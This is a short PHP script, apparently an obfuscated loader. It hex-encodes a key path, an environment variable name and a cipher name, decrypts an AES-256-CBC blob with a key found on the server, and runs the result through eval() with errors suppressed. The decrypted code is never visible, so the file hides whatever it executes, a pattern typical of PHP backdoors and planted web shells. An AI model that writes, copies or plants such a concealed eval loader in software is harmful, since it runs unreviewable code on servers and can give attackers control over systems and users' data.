<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('yJzYoEc/zIC/PL+9LdgzvQ==');

$c=base64_decode(

'7GKoZv66kifXwY9GeEPbMXGtjuTY9h0Lf2Q0J7+8bf6EujKHCV026Sa7SWqIDQzY9hgxM9hPb/9U' .
'C9hCp6PUFShkDN5RXaOMAToWYpTC51J+MciULGG8k+a4eWiT15eQYbm59muD7CIG+xV9slOBxskI' .
'ynb5rO1jqdUUD+JLHZvzL/7W+RWoSAFvFzqpN/zUsmiOsh1h0tCyBE8BzLCEXZ+BWATRpZn+iHQK' .
'b0qhQtaH9jUxJdGHJHS/3mQxeN3qDXfkhf6swdp+l/4WMt2ZmcKBJVmK3CkIY2+MTOBllx8ptj8M' .
'haNediRkv7eap9DzH4zc4u01nRpjGVLiUn5IC5rbvLJI47DO6JVb1ubvlI7t/7s3cafBBEgLB/Z1' .
'A8E5tancfS6cV6xAGesp3JQt490vG2CbXf4aMpgkYHCB1a6ea4VyoHHohAm5Ahlg7sZ8DsuNLLxq' .
'+KeFGbieDApfS0x2fFnmaNhnDg5Qwztu3F2I/7kV+dgXxMhFPqeLGfzxJSkiX9bTh5+obCVY/QWF' .
'ZTz0ZN45HtiXu5YEkqnWv5o='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

